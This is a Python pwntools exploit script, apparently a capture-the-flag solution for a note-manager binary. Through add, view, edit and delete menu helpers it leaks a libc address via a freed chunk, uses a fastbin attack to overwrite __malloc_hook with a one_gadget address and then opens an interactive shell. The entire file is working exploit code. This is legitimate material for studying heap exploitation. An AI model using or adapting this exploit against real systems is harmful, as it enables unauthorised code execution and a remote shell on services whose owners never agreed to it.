#coding:utf-8

from pwn import *
from time import sleep

context.log_level = "debug"

local = 1
if local:
    p = remote("172.17.0.2", 1234)
    raw_input("go")
else:
    p = remote("127.0.0.1", 1234)


def add(title, size, content):
    p.sendline("1")
    p.recvuntil("input title: ")
    p.sendline(title)
    p.sendlineafter("input content size: ", str(size))
    p.recvuntil(" input content: ")
    p.send(content)

def view(title):
    p.sendline("2")
    p.sendlineafter(" input note title: ", title)

def edit(title, content):
    p.sendline("3")
    p.sendlineafter("input note title: ", title)
    p.recvuntil(" input new content: ")
    p.send(content)

def delete(title):
    p.sendline("4")
    p.sendlineafter(" input note title: ", title)


p.recvuntil("5. Exit\n")
add("qwe", 0x80, 'l'*0x80)
add("qwe1", 0x60, "a"*0x60)
add("qwe2", 0x60, 'b'*0x60)
add("qwe3", 0x60, 'c'*0x60)

view("qwe")
delete('0')

view("")
p.recvuntil("note content: ")
main_arena_88 = u64(p.recv(6).ljust(8, '\x00'))
libc_base = main_arena_88 - 88 - 0x3c4b20
malloc_hook_addr = libc_base + 0x3c4b10
info("malloc_hook_addr : {}".format(hex(malloc_hook_addr)))
one_gadget = libc_base + 0x45216
# free_hook

add("qwe", 0x60, 'l'*0x60)
view("qwe")
delete("0")

edit("", p64(malloc_hook_addr-0x23)+'\n')
add("qwe4", 0x60, 'd'*0x60)
add("qwe5", 0x60, '\x00'*3+p64(0)*2+p64(one_gadget)+'\n')
p.sendline("1")

p.interactive()
